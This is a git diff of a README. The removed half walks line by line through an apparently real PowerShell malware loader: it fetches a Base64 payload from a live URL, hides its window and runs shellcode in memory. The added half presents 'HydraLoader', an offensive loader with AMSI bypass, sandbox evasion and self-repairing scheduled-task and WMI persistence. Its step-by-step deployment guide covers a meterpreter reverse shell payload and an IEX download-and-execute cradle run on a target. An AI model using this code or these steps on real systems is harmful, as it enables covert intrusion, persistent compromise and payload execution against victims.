@@ -1,177 +1,213 @@
-# PowerShell-Loader
+<p align="center">
+  <img src="https://i.imgur.com/lS836hA.png" alt="HydraLoader Logo" width="200"/>
+</p>
+<h1 align="center">
+  <br>
+  🐍 HydraLoader 🛡️
+  <br>
+</h1>
 
-**🚀 Exploring PowerShell Memory Loader Techniques 🚀**
+<h4 align="center">The process that refuses to die. A PowerShell loader built on a self-healing persistence engine, designed to survive and thrive even under active incident response.</h4>
 
-▶️Let's get back the PowerShell script that showcases advanced memory loading techniques. This script downloads, decodes, and executes a payload in memory, all while staying stealthy. We will walk through each line of code, explaining how it works, step by step. 🌶
+<p align="center">
+  <a href="https://github.com/ZeroEthical/HydraLoader/blob/main/LICENSE">
+    <img src="https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge" alt="License">
+  </a>
+  <a href="#">
+    <img src="https://img.shields.io/badge/Language-PowerShell-blue.svg?style=for-the-badge&logo=powershell" alt="Language">
+  </a>
+    <a href="https://github.com/ZeroEthical">
+    <img src="https://img.shields.io/badge/Author-ZeroEthical-purple?style=for-the-badge" alt="Author">
+  </a>
+  <a href="#">
+    <img src="https://img.shields.io/badge/Maintained%3F-Yes-green.svg?style=for-the-badge" alt="Maintained">
+  </a>
+</p>
 
-Environment Setup 👩‍💻
+<p align="center">
+  <a href="#-about-the-project">About</a> •
+  <a href="#-key-features">Key Features</a> •
+  <a href="#-architecture--flow">Architecture</a> •
+  <a href="#-getting-started">Getting Started</a> •
+  <a href="#-disclaimer">Disclaimer</a> •
+  <a href="#-author">Author</a>
+</p>
 
-The script begins by setting up the environment to ensure compatibility and persistence.
+---
 
-$powershell_path = $env:windir + "\syswow64\WindowsPowerShell\v1.0\powershell.exe"
-$command_line_args = ((Get-WmiObject win32_process -Filter "ProcessId=$PID").CommandLine) -split '"'
-$script_argument = $command_line_args[$command_line_args.Length - 2]
-$is_64bit = ([IntPtr]::Size -eq 8)
-if (-not $is_64bit) { $powershell_path = "powershell.exe" }
-$is_valid_context = ($odontoclast -or $is_64bit)
-$user_profile = $env:userprofile
+## 📖 About The Project
 
-🟠$env:windir + "\syswow64\WindowsPowerShell\v1.0\powershell.exe": Finds the PowerShell executable, defaulting to the 64-bit version. 📂
-🟠Get-WmiObject win32_process -Filter "ProcessId=$PID": Grabs the command-line arguments of the current process to extract $script_argument for persistence. 📹
-🟠[IntPtr]::Size -eq 8: Checks if the system is 64-bit, adjusting $powershell_path to powershell.exe for 32-bit systems. 🔍
-🟠$odontoclast -or $is_64bit: Uses a flag (likely set in a prior stage) to determine if execution should proceed. 🧩
-🟠$env:userprofile: Gets the user’s profile directory (e.g., C:\Users\Username) for later use. 🏠
+**HydraLoader** is a highly sophisticated and resilient PowerShell-based payload execution framework, designed for advanced penetration testing and red teaming operations. It employs a multi-layered approach to evasion, persistence, and in-memory execution, aiming to operate undetected in modern, highly monitored environments.
 
-Persistence via Process Spawning 🔄
+---
 
-If conditions are met, the script launches a new PowerShell process to maintain execution.
-```
-if ($is_valid_context) {
-    $quoted_argument = '"' + $script_argument + '"'
-    while (-not $shell_application) {
-        $shell_type = [Type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}")
-        $shell_instance = [System.Activator]::CreateInstance($shell_type)
-        $shell_application = $shell_instance.Item()
-        if (-not $shell_application) { $placeholder = ''; $shell_application = $shell_instance.Item(0) }
-        if (-not $shell_application) { Start-Process "explorer.exe"; Start-Sleep 1 }
-    }
-    $shell_application.Document.Application.ShellExecute($powershell_path, $quoted_argument, $user_profile, $null, 0)
-    exit
-}
-```
-🟠if ($is_valid_context): Proceeds if the system is 64-bit or $odontoclast is true (likely from an earlier stage). 
-🟠$quoted_argument = '"' + $script_argument + '"': Quotes the extracted argument for safe passing. 
-🟠[Type]::GetTypeFromCLSID("{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"): Gets the Shell.Application COM object using its CLSID.
-🟠while (-not $shell_application): Loops until the COM object is initialized, falling back to Item(0) or launching explorer.exe to ensure a shell environment. 
-🟠ShellExecute($powershell_path, $quoted_argument, $user_profile, $null, 0): Spawns a new PowerShell process with the argument in the users profile directory, hiding the window (0).
-🟠exit: Terminates the current script after spawning the new process.
+## ✨ Key Features
 
-Native API Access Functions ⚙️
+<details>
+<summary>🧠 <strong>Evasion & Anti-Analysis</strong></summary>
+<br>
 
-The script defines functions to interact with Windows APIs directly, enabling low-level operations.
-```
-function Get-FunctionPointer {
-    param ([string]$dll_name, [string]$function_name)
-    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
-    $kernel32_module = $kernel32_handle.GetMethod("GetModuleHandle").Invoke($null, @($dll_name))
-    $method = $kernel32_handle.GetMethod("GetProcAddress", [Type[]] @("System.Runtime.InteropServices.HandleRef", "string"))
-    return $method.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $kernel32_module)), $function_name))
-}
-function Create-Delegate {
-    param ([Parameter(Position = 0)] [Type[]]$parameter_types, [Parameter(Position = 1)] [Type]$return_type = [Void])
-    $assembly = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), "Run")
-    $module = $assembly.DefineDynamicModule("InMemoryModule", $false)
-    $delegate_type = $module.DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])
-    $method = $delegate_type.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $return_type, $parameter_types)
-    $method.SetImplementationFlags("Runtime, Managed")
-    return $delegate_type.CreateType()
-}
-```
-🟠Get-FunctionPointer: Loads a DLL (e.g., kernel32) and retrieves a function’s address using GetModuleHandle and GetProcAddress.
-🟠Create-Delegate: Dynamically creates a .NET delegate for a native function, specifying parameter and return types. This allows PowerShell to call APIs like VirtualAlloc.
-🟠These functions enable direct memory manipulation and execution, bypassing standard PowerShell cmdlets.
+-   **In-Memory AMSI Bypass**: Dynamically patches the Antimalware Scan Interface (AMSI) at runtime to neutralize script-based threat detection.
+-   **Comprehensive Environment Checks**: Actively detects and evades analysis environments by checking for:
+    -   **Debuggers**: Uses native `IsDebuggerPresent()` API calls.
+    -   **Sandboxes**: Verifies system RAM, CPU core count, and uptime.
+    -   **Analysis Tools**: Scans for common virtualization and analysis processes (e.g., Wireshark, Process Monitor, VMware/VirtualBox tools).
+-   **Deep Obfuscation**: The entire script is heavily obfuscated, with critical strings (API functions, DLLs) Base64 encoded and a compacted code structure to deter static analysis.
+</details>
 
-Payload Download and Decoding 📥
-The script fetches and prepares an external payload.
-```
-$download_path = 'Opsamlingscirkulrerne.Oxy'
-[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
-$web_client = New-Object System.Net.WebClient
-$web_client.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/14.0'
-$payload_url = "http://kerisel.fr/js/Ovenanfrt.mix"
-$web_client.DownloadFile($payload_url, $download_path)
-$downloaded_data = Get-Content $download_path
-$payload_bytes = [System.Convert]::FromBase64String($downloaded_data)
-```
-🟠$download_path = 'Opsamlingscirkulrerne.Oxy': Sets a temporary file name for the downloaded payload. 
-🟠[Net.ServicePointManager]::SecurityProtocol = 'Tls12': Ensures secure HTTPS connections.
-🟠New-Object System.Net.WebClient: Creates a web client for downloading.
-🟠$web_client.Headers['User-Agent'] = 'Mozilla/5.0...': Mimics a Firefox browser to avoid detection.
-🟠DownloadFile($payload_url, $download_path): Downloads the payload from the specified URL to the temp file.
-🟠Get-Content $download_path: Reads the file’s contents.
-🟠[System.Convert]::FromBase64String($downloaded_data): Decodes the Base64 content into a byte array ($payload_bytes).
+<details>
+<summary>🐍 <strong>The "Hydra" Persistence Engine</strong></summary>
+<br>
 
-Stealth: Window Hiding 🕶
+HydraLoader employs a dual-headed, self-healing persistence mechanism to ensure long-term access and resilience against removal attempts.
 
-To avoid detection, the script hides its presence.
-```
-$zero = 0
-$window_title = 'dyreklasser'
-$Host.UI.RawUI.WindowTitle = $window_title
-$target_process = (Get-Process | Where-Object { $_.MainWindowTitle -eq $window_title })
-$window_handle = $target_process.MainWindowHandle
-$show_window_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Get-FunctionPointer "user32" "ShowWindow"),
-    (Create-Delegate @([IntPtr], [UInt32]) ([IntPtr]))
-)
-$show_window_delegate.Invoke($window_handle, $zero)
-```
-🟠$window_title = 'dyreklasser': Sets a benign console title. 
-🟠$Host.UI.RawUI.WindowTitle = $window_title: Applies the title to the current process. 
-🟠Get-Process | Where-Object { $_.MainWindowTitle -eq $window_title }: Finds the process with this title. 
-🟠Get-FunctionPointer "user32" "ShowWindow": Gets the ShowWindow API function pointer. 
-🟠Create-Delegate @([IntPtr], [UInt32]) ([IntPtr]): Creates a delegate for ShowWindow. 
-🟠$show_window_delegate.Invoke($window_handle, $zero): Hides the process window using SW_HIDE (0).
+-   **Method 1: Scheduled Task (Elevated Privileges)**: Creates a scheduled task disguised as a legitimate system process (`Microsoft Compatibility Appraiser`) that runs with `SYSTEM` privileges at logon.
+-   **Method 2: WMI Event Subscription (Maximum Stealth)**: Establishes a permanent WMI event subscription that triggers on a timer. This method is extremely difficult to detect as it resides in the WMI repository, outside of standard auto-run locations.
+-   **Self-Healing Capability**: On each execution, the framework checks if both persistence mechanisms are active. If one has been discovered and removed, the other automatically recreates it, ensuring the "Hydra" survives.
+</details>
 
-Memory Allocation 💾
+<details>
+<summary>🚀 <strong>Payload Execution</strong></summary>
+<br>
 
-The script allocates memory for the payload.
-```
-$virtual_alloc_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Get-FunctionPointer "kernel32" "VirtualAlloc"),
-    (Create-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
-)
-$protect_memory_delegate = Get-FunctionPointer "ntdll" "NtProtectVirtualMemory"
-$allocation_size1 = 12288
-$allocation_size2 = 4
-$protection_flag = 4
-$memory_region1 = $virtual_alloc_delegate.Invoke($zero, 6974, $allocation_size1, $protection_flag)
-$memory_region2 = $virtual_alloc_delegate.Invoke($zero, 45805568, $allocation_size1, $protection_flag)
-```
-🟠Get-FunctionPointer "kernel32" "VirtualAlloc": Gets the VirtualAlloc API pointer.
-🟠Create-Delegate @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]): Creates a delegate for VirtualAlloc.
-🟠$protect_memory_delegate: Gets the NtProtectVirtualMemory pointer for memory protection.
-🟠$allocation_size1 = 12288, $allocation_size2 = 4, $protection_flag = 4: Sets sizes and PAGE_EXECUTE_READWRITE (0x04) permissions.
-🟠$virtual_alloc_delegate.Invoke($zero, 6974, $allocation_size1, $protection_flag): Allocates 6,974 bytes for the first region.
-🟠$virtual_alloc_delegate.Invoke($zero, 45805568, $allocation_size1, $protection_flag): Allocates a large 45MB region.
+-   **"Fileless" In-Memory Operation**: The payload is downloaded directly into a memory buffer, decoded, and executed without ever touching the disk, minimizing the forensic footprint.
+-   **AES-256 Decryption Framework**: Includes a function to decrypt payloads using AES-256 (CBC). This allows the payload to be stored and transmitted in an encrypted state, rendering it useless to network inspection tools. *(Note: Requires a pre-encrypted payload)*.
+-   **Dynamic API Resolution**: Resolves all necessary Windows API functions dynamically at runtime, avoiding suspicious static import tables.
+</details>
 
-Payload Injection and Execution
+---
 
-💉💉💉💉💉💉💉💉
+## ⚙️ Architecture & Flow
 
-The script loads and runs the payload in memory.
-```
-[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, $zero, $memory_region1, 6974)
-[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, 6974, $memory_region2, (393989 - 6974))
-$call_window_proc_delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Get-FunctionPointer "USER32" "CallWindowProcA"),
-    (Create-Delegate @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr]))
-)
-$call_window_proc_delegate.Invoke($memory_region1, $memory_region2, $protect_memory_delegate, $zero, $zero)
-```
+1.  **Initialization**: The AMSI bypass is executed instantly.
+2.  **Evasion Checks**: The script performs all anti-analysis and anti-sandbox checks. If any fail, it terminates silently.
+3.  **Persistence Check & Repair**: The Hydra engine verifies that both the Scheduled Task and WMI Subscription are in place. If not, it creates them.
+4.  **Payload Delivery**: The framework downloads the payload from the configured URL directly into memory.
+5.  **Decryption & Preparation**: The payload is Base64 decoded. If AES is enabled, it is then decrypted.
+6.  **Execution**: The final payload is injected into memory and executed via stealthy Windows API calls.
 
-🟠[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, $zero, $memory_region1, 6974): Copies the first 6,974 bytes to the small memory region.
-🟠[System.Runtime.InteropServices.Marshal]::Copy($payload_bytes, 6974, $memory_region2, (393989 - 6974)): Copies the remaining 387,015 bytes to the large region.
-🟠Get-FunctionPointer "USER32" "CallWindowProcA": Gets the CallWindowProcA API pointer.
-🟠Create-Delegate @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr]): Creates a delegate for CallWindowProcA. 
-🟠$call_window_proc_delegate.Invoke($memory_region1, $memory_region2, $protect_memory_delegate, $zero, $zero): Executes the first regions code (likely shellcode), passing the second region and memory protection function.
+---
 
-Connection to Earlier Stages 🔗
+## 🚀 How to Use This Beast 😏
 
-This script is part of a multi-stage process:
+This guide will walk you through preparing your payload, configuring HydraLoader, and deploying it on a target system.
 
-➡️Stage 0: Likely decodes configuration or flags (e.g., $odontoclast) using functions like Uninstructedness to process strings (e.g., 'LLL{LL 9LL.BLLLALLL0LLL5 ...'). 🧬
-➡️Stage 1: Downloads and decodes the Base64 payload, producing $payload_bytes. 📥
-➡️Stage 2: Executes the payload in memory, as shown above. 🚀
+### Step 1: Payload Preparation (Example with `msfvenom`)
 
-🔥🔥🔥 Why It is undetected and smart 🧠
+First, you need to generate your shellcode. For this example, we'll create a simple reverse shell payload.
 
-This script uses:
+1.  **Generate Raw Shellcode**:
+    Use a tool like Metasploit's `msfvenom` to create the raw shellcode.
 
-▶️In-Memory Execution: Avoids disk writes to evade antivirus. 🕵️
-▶️Native API Calls: Bypasses PowerShell’s standard cmdlets for stealth. ⚙️
-▶️Base64 Decoding: Hides the payload in transit. 🔑
-▶️Window Hiding: Keeps the process invisible to users. 👻
-▶️Persistence: Spawns new processes to maintain execution. 🔄
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f raw -o shellcode.bin
+    ```
+    > Replace `YOUR_IP` and `YOUR_PORT` with your listener's details.
 
-This is a masterclass in PowerShell scripting for advanced memory operations. 🤓
+2.  **Encode the Shellcode in Base64**:
+    HydraLoader expects the payload to be Base64 encoded.
+
+    ```powershell
+    # In PowerShell
+    $bytes = [System.IO.File]::ReadAllBytes("C:\path\to\shellcode.bin")
+    [System.Convert]::ToBase64String($bytes) | Out-File shellcode_b64.txt
+    ```
+    > Copy the resulting Base64 string. You'll need it in the next step.
+
+### Step 2: Host Your Payload
+
+1.  **Host the Base64 Payload**:
+    Paste the Base64 string you just copied into a file (e.g., `payload.txt`) and host it on a web server or a service like GitHub Gist, Pastebin, etc.
+2.  **Get the Raw URL**:
+    Make sure you have a direct, raw link to the file content. For example, a GitHub Gist raw URL looks like `https://gist.githubusercontent.com/user/gist_id/raw/payload.txt`.
+
+### Step 3: Configure HydraLoader
+
+Now, you need to configure the `MALWARE DECODED.ps1` script itself.
+
+1.  **Update the Payload URL**:
+    -   Find the `$cfg` hashtable at the beginning of the script.
+    -   Locate the key `$cfg.o`. This holds the Base64 encoded URL of your payload.
+    -   First, encode your raw payload URL in Base64:
+        ```powershell
+        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("https://your-raw-payload-url.com/payload.txt"))
+        ```
+    -   Replace the existing value of `$cfg.o` with your new Base64 encoded URL.
+
+### Step 4: (Optional) Configure AES Encryption for Maximum Stealth
+
+If you want to add another layer of protection, you can encrypt your payload.
+
+1.  **Generate a Key and IV**:
+    You need a 32-byte (256-bit) key and a 16-byte (128-bit) IV. You can generate them in PowerShell:
+    ```powershell
+    # Generate a random 32-byte key
+    $key = -join ((0..31) | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) })
+    # Generate a random 16-byte IV
+    $iv = -join ((0..15) | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) })
+
+    Write-Host "Key: $key"
+    Write-Host "IV: $iv"
+    ```
+
+2.  **Encrypt the Shellcode**:
+    Use your favorite encryption script or tool (like CyberChef) with your generated Key and IV to encrypt your **raw** shellcode file (`shellcode.bin`). Then, Base64 encode the **encrypted** output.
+
+3.  **Configure HydraLoader with Keys**:
+    -   Base64 encode your Key and IV:
+        ```powershell
+        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("YOUR_32_BYTE_KEY_HERE"))
+        [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("YOUR_16_BYTE_IV_HERE"))
+        ```
+    -   Update `$cfg.r` (key) and `$cfg.s` (IV) in the script with these new Base64 values.
+
+4.  **Activate Decryption in Script**:
+    -   In the `MALWARE DECODED.ps1` script, find the payload handling section.
+    -   Uncomment the three lines responsible for decryption:
+        ```powershell
+        # $k = [System.Text.Encoding]::UTF8.GetBytes((Get-Data $cfg.r)); $iv = [System.Text.Encoding]::UTF8.GetBytes((Get-Data $cfg.s))
+        # $exec_buf = Expand-Stream -d $buf -k $k -iv $iv; if (-not $exec_buf) { exit }
+        ```
+        And comment out the line that bypasses it:
+        ```powershell
+        # $exec_buf = $buf
+        ```
+
+### Step 5: Deployment
+
+With your payload prepared and HydraLoader configured, you're ready for deployment.
+
+1.  **Set Up Your Listener**:
+    Start your C2 listener (e.g., Metasploit's `multi/handler`) to catch the incoming connection.
+
+2.  **Execute on Target**:
+    Deliver and execute the `MALWARE DECODED.ps1` script on the target machine. You can use any standard execution method:
+    ```powershell
+    # Example: Direct execution
+    powershell.exe -ExecutionPolicy Bypass -File ".\MALWARE DECODED.ps1"
+
+    # Example: Remote download and execution (IEX cradle)
+    powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://your-server/MALWARE%20DECODED.ps1')"
+    ```
+    On its first run, HydraLoader will set up its persistence mechanisms and then proceed with the payload execution. Subsequent runs will ensure persistence is maintained before executing the payload.
+
+---
+
+## ⚠️ Disclaimer
+
+This tool is intended for authorized red teaming, security research, and educational purposes **only**. Unauthorized use of this framework against any system is illegal. The author assumes no liability and is not responsible for any misuse or damage caused by this program.
+
+---
+
+## 🙏 Acknowledgements
+
+A special thanks to our friends in the Telegram community for providing the base code that inspired the creation of this project.
+
+-   [@scarlettaowner](https://t.me/scarlettaowner)
+-   [@viperzcrew](https://t.me/viperzcrew)
+
+---
+
+## ✍️ Author
+
+-   **ZeroEthical** - [GitHub](https://github.com/ZeroEthical)
